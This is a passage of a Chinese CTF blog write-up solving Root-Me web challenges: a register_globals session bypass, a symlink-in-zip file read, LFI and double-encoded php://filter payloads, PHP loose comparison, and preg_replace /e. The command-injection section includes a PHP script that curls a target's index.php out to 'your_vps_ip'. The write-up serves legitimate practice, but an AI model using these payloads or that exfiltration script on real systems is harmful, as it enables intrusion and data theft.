class="line">    $_SESSION[<span class="string">"logged"</span>]=$res;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($res)</span></span>&#123;</span><br><span class="line">    $aff= <span class="string">'</span></span><br><span class="line"><span class="string">	  &lt;html&gt;</span></span><br><span class="line"><span class="string">	  &lt;head&gt;</span></span><br><span class="line"><span class="string">	  &lt;/head&gt;</span></span><br><span class="line"><span class="string">	  &lt;body&gt;</span></span><br><span class="line"><span class="string">	    &lt;h1&gt;Authentication v 0.05&lt;/h1&gt;</span></span><br><span class="line"><span class="string">	    &lt;form action="" method="POST"&gt;</span></span><br><span class="line"><span class="string">	      Password&amp;nbsp;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	      &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	      &lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	      &lt;input type="submit" value="connect" /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	    &lt;/form&gt;</span></span><br><span class="line"><span class="string">	    &lt;h3&gt;'</span>.htmlentities($res).<span class="string">'&lt;/h3&gt;</span></span><br><span class="line"><span class="string">	  &lt;/body&gt;</span></span><br><span class="line"><span class="string">	  &lt;/html&gt;'</span>;</span><br><span class="line">    <span class="keyword">return</span> $aff;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">isset</span>($_SESSION[<span class="string">"logged"</span>]) )</span><br><span class="line">    $_SESSION[<span class="string">"logged"</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">$aff=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.inc.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]))</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ini_get(<span class="string">'register_globals'</span>)) &#123;</span><br><span class="line">    $superglobals = <span class="keyword">array</span>($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION)) &#123;</span><br><span class="line">        array_unshift($superglobals, $_SESSION);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($superglobals <span class="keyword">as</span> $superglobal) &#123;</span><br><span class="line">        extract($superglobal, <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (( <span class="keyword">isset</span> ($password) &amp;&amp; $password!=<span class="string">""</span> &amp;&amp; auth($password,$hidden_password)==<span class="number">1</span>) || (is_array($_SESSION) &amp;&amp; $_SESSION[<span class="string">"logged"</span>]==<span class="number">1</span> ) )&#123;</span><br><span class="line">    $aff=display(<span class="string">"well done, you can validate with the password : $hidden_password"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $aff=display(<span class="string">"try again"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $aff;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键逻辑为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (( <span class="keyword">isset</span> ($password) &amp;&amp; $password!=<span class="string">""</span> &amp;&amp; auth($password,$hidden_password)==<span class="number">1</span>) || (is_array($_SESSION) &amp;&amp; $_SESSION[<span class="string">"logged"</span>]==<span class="number">1</span> ) )&#123;</span><br><span class="line">    $aff=display(<span class="string">"well done, you can validate with the password : $hidden_password"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $aff=display(<span class="string">"try again"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可知我们得到flag有两种方法</p>
+<ul>
+<li>输入的password和系统的passwd相同</li>
+<li>使session中的logged值为1</li>
+</ul>
+<p>前者显然不可能，因为我们并不知道密码是什么，对于后者看标题可知，服务器应该配置了 <code>register globals</code> 为 on，这样的话各种变量都被注入代码，例如来自 HTML 表单的请求变量，所以我们可以以GET方法直接请求变量名</p>
+<p>payload</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://challenge01.root-me.org/web-serveur/ch17/index.php?_SESSION</span>[<span class="string">logged</span>]=1</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，官方文档中提到</p>
+<blockquote>
+<p>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p>
+</blockquote>
+<p>在较高版本中该漏洞不存在</p>
+<p>PS：这道题目的flag并不是很长而且没有特殊字符，所以理论上应该还存在密码爆破的可能</p>
+<h2 id="File-upload-ZIP"><a href="#File-upload-ZIP" class="headerlink" title="File upload - ZIP"></a>File upload - ZIP</h2><p>题目要求我们读取网站的index.php文件，尝试上传zip文件，网站会自动将我们的zip文件解压并返回文件位置，我们可以读取文件（网站只能够解析TXT文件和图片文件），这显然无法实现我们的目标，我们始终只能够读取我们上传的文本文件或者图片，我们应该试图寻找一种方法能够在文本文件中实现跨文件读取，从而读取目标文件，找了很久的资料，找到了一种方法：<strong>建立symlink（符号索引）</strong> ，类似于windows环境下的快捷方式</p>
+<blockquote>
+<p>符号链接，这个文件包含了另一个文件的路径名。可以是任意文件或目录，也可以链接不同文件系统的文件。甚至可以链接不存在的文件，这就产生一般称为“断裂”的问题（现象），还可以不断的循环链接自己。<br>用ln -s 命令可以生成一个符号链接，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s source_file  softlink_file</span><br></pre></td></tr></table></figure></p>
+<p>在对符号链接进行读写操作的时候，系统会自动把该操作转换为对源文件的操作。但是删除链接文件时，系统仅仅删除符号链接文件，而不删除源文件本身。</p>
+</blockquote>
+<p>那么我们可以尝试建立符号链接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../index.php index</span><br></pre></td></tr></table></figure>
+<p>然后目录下会出现一个index的符号链接，压缩为zip文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -y index.zip index</span><br></pre></td></tr></table></figure>
+<p>然后提交即可读到目标文件，得到flag。</p>
+<h2 id="Command-injection-Filter-bypass"><a href="#Command-injection-Filter-bypass" class="headerlink" title="Command injection - Filter bypass"></a>Command injection - Filter bypass</h2><p>命令执行，用分号不可以了，被过滤了，而且题目不返回执行后的内容，只返回 <code>Ping OK</code> 或者 <code>Syntax Error</code> 等状态信息，尝试 <code>%0a</code> 绕过，得到正常回显，后面还发现 <code>|,&amp;</code> 等也被过滤了，可以尝试反向shell，本来尝试简单的bashshell，但是无法得到稳定的shell，百度了一下资料，找到了一个方法，本题可以使用curl等命令，我们可以尝试在本机上新建一个PHP文件，该文件的功能是读取index.php并发送到指定的主机上；然后执行命令让靶机下载并执行这个文件从而可以在我们的主机上读取到index.php的文件内容。</p>
+<p>具体步骤如下：</p>
+<ul>
+<li>1.在自己的vps上新建一个 <strong>flag.txt</strong> ，不写入任何内容。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi flag.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li>2.在本地主机上新建一个 <strong>getdata.php</strong> 文件，写入内容如下</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$txt=$_GET[<span class="string">'c'</span>];</span><br><span class="line">$myfile = fopen(<span class="string">"flag.txt"</span>, <span class="string">"a"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">fwrite($myfile, <span class="string">"\r\n"</span>);</span><br><span class="line">fwrite($myfile, $txt);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>3.在本地主机上新建一个<strong>sendrequest.txt</strong>文件，写入如下内容</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cSession = curl_init();</span><br><span class="line">$content = bin2hex(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">curl_setopt($cSession,CURLOPT_URL,<span class="string">"http://your_vps_ip/getdata.php?c="</span>.$content);</span><br><span class="line">curl_setopt($cSession,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">curl_setopt($cSession,CURLOPT_HEADER,<span class="keyword">false</span>);</span><br><span class="line">$result = curl_exec($cSession);</span><br><span class="line">curl_close($cSession);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>4.向靶机发送请求</li>
+</ul>
+<p><img src="/2018/07/31/rootme/7.png" alt=""></p>
+<ul>
+<li>5.之后在本机上读取flag.txt文件的内容再解码为字符串即可</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">"************************************"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"ip"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"ip"</span>]))&#123;</span><br><span class="line">        $ip = @preg_replace(<span class="string">"/[\\\$|`;&amp;&lt;&gt;]/"</span>, <span class="string">""</span>, $_POST[<span class="string">"ip"</span>]);</span><br><span class="line">        $response = @shell_exec(<span class="string">"timeout 5 bash -c 'ping -c 3 "</span>.$ip.<span class="string">"'"</span>);</span><br><span class="line">        $receive = @preg_match(<span class="string">"/3 packets transmitted, (.*) received/s"</span>,$response,$out);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($out[<span class="number">1</span>]==<span class="string">"3"</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Ping OK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($out[<span class="number">1</span>]==<span class="string">"0"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Ping NOK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Syntax Error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>PS：本题我折腾了好久，原因在于我的web服务老是配置错误无法执行PHP文件，还有文件权限配置错误，这两点需要注意。</p>
+<h2 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h2><p>本地文件包含漏洞的利用，可以先试一下文件遍历</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch16<span class="regexp">/?files=../</span></span><br></pre></td></tr></table></figure>
+<p>发现有admin文件，访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch16<span class="regexp">/?files=../</span>admin&amp;f=index.php</span><br></pre></td></tr></table></figure>
+<p>找一下即可得到flag</p>
+<h2 id="Local-File-Inclusion-Double-encoding"><a href="#Local-File-Inclusion-Double-encoding" class="headerlink" title="Local File Inclusion - Double encoding"></a>Local File Inclusion - Double encoding</h2><p>漏洞点：url二次编码绕过，本题中 <code>. /</code> 等分界符被过滤了，所以可以尝试二次编码绕过 </p>
+<p>百度url编码即可查到各个字符的url编码</p>
+<p>我最开始尝试的是目录跳转，可是没有什么进展，题目返回报错信息</p>
+<p><img src="/2018/07/31/rootme/8.png" alt=""></p>
+<p>看到有个包含的文件后缀是必须是.inc.php，所以尝试获取PHP的配置文件试试看 <code>conf.inc.php</code>，用PHP的filter协议</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=conf</span><br></pre></td></tr></table></figure>
+<p>然后url编码两次提交再解码即可得到flag。</p>
+<h2 id="PHP-Loose-Comparison"><a href="#PHP-Loose-Comparison" class="headerlink" title="PHP - Loose Comparison"></a>PHP - Loose Comparison</h2><p>本题是一道很基础的PHP弱比较问题，但是这题的代码很长，有点吓到我了，导致我很久都没搞清楚这题的考点，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secured_random</span><span class="params">()</span> </span>&#123; <span class="comment">// cause random is the way</span></span><br><span class="line">    $a = rand(<span class="number">1337</span>,<span class="number">2600</span>)*<span class="number">42</span>;</span><br><span class="line">    $b = rand(<span class="number">1879</span>,<span class="number">1955</span>)*<span class="number">42</span>;</span><br><span class="line">    $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secured_hash_function</span><span class="params">($plain)</span> </span>&#123; <span class="comment">// cause md5 is the best hash ever</span></span><br><span class="line">    $secured_plain = sanitize_user_input($plain);</span><br><span class="line">    <span class="keyword">return</span> md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize_user_input</span><span class="params">($input)</span> </span>&#123; <span class="comment">// cause someone told me to never trust user input</span></span><br><span class="line">    $re = <span class="string">'/[^a-zA-Z0-9]/'</span>;</span><br><span class="line">    $secured_input = preg_replace($re, <span class="string">""</span>, $input);</span><br><span class="line">    <span class="keyword">return</span> $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"secret.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Fail..."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;p&gt;Hum ...&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键逻辑如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>首先提交参数s和t，然后对于s执行验证，控制只能输入英文字符和数字；对于h，也是先验证输入合法性，然后返回提交的字符串md5值，$r变量是一串随机数，最后r拼接在s后面与h的md5值进行 <code>==</code> 比较，此处出现漏洞，那么我们可以令s为 <code>0e</code> 开头的字符串，h为hash值是0e开头的字符串从而绕过验证</p>
+<p><img src="/2018/07/31/rootme/11.png" alt="payload"></p>
+<h2 id="PHP-preg-replace"><a href="#PHP-preg-replace" class="headerlink" title="PHP preg_replace()"></a>PHP preg_replace()</h2><p>题目是一个界面，让我们提交preg_replace()函数需要的参数从而返回相应的结果，查阅官方文档发现如下资料</p>
+<p><img src="/2018/07/31/rootme/9.png" alt="正则匹配修饰符e"></p>
+<p>根据官方文档可以知道，当我们使用使用了e参数后，我们的匹配内容会被当做PHP代码执行，于是我们可以利用这个特性读取flag.php文件</p>
+<p><img src="/2018/07/31/rootme/10.png" alt="payload"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+  <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您今天怎么辣么迷人！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/reward-wechat.png" alt="新城瑞雪 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="新城瑞雪 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>新城瑞雪</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://chaosec.top/2018/07/31/rootme/" title="rootme.webserver1">http://chaosec.top/2018/07/31/rootme/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/31/solveme/" rel="next" title="Solveme题解">
+                <i class="fa fa-chevron-left"></i> Solveme题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/06/rootme1/" rel="prev" title="rootme.webserver2">
+                rootme.webserver2 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">新城瑞雪</p>
+              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index-2.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
+             </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Server"><span class="nav-number">2.</span> <span class="nav-text"><a href="#Web-Server" class="headerlink" title="Web-Server"></a>Web-Server</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML"><span class="nav-number">2.1.</span> <span class="nav-text"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Open-redirect"><span class="nav-number">2.2.</span> <span class="nav-text"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP-Open redirect"></a>HTTP-Open redirect</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-injection"><span class="nav-number">2.3.</span> <span class="nav-text"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weak-password"><span class="nav-number">2.4.</span> <span class="nav-text"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-agent"><span class="nav-number">2.5.</span> <span class="nav-text"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Backup-file"><span class="nav-number">2.6.</span> <span class="nav-text"><a href="#Backup-file" class="headerlink" title="Backup file"></a>Backup file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-POST"><span class="nav-number">2.7.</span> <span class="nav-text"><a href="#HTTP-POST" class="headerlink" title="HTTP - POST"></a>HTTP - POST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-directory-indexing"><span class="nav-number">2.8.</span> <span class="nav-text"><a href="#HTTP-directory-indexing" class="headerlink" title="HTTP directory indexing"></a>HTTP directory indexing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Headers"><span class="nav-number">2.9.</span> <span class="nav-text"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a>HTTP Headers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-verb-tampering"><span class="nav-number">2.10.</span> <span class="nav-text"><a href="#HTTP-verb-tampering" class="headerlink" title="HTTP verb tampering"></a>HTTP verb tampering</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Install-files"><span class="nav-number">2.11.</span> <span class="nav-text"><a href="#Install-files" class="headerlink" title="Install files"></a>Install files</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Improper-redirect"><span class="nav-number">2.12.</span> <span class="nav-text"><a href="#Improper-redirect" class="headerlink" title="Improper redirect"></a>Improper redirect</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRLF"><span class="nav-number">2.13.</span> <span class="nav-text"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-upload-double-extensions"><span class="nav-number">2.14.</span> <span class="nav-text"><a href="#File-upload-double-extensions" class="headerlink" title="File upload - double extensions"></a>File upload - double extensions</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-upload-MIME-type"><span class="nav-number">2.15.</span> <span class="nav-text"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a>File upload - MIME type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-cookies"><span class="nav-number">2.16.</span> <span class="nav-text"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</span></a></li><li class="nav-item nav-level-2"><a 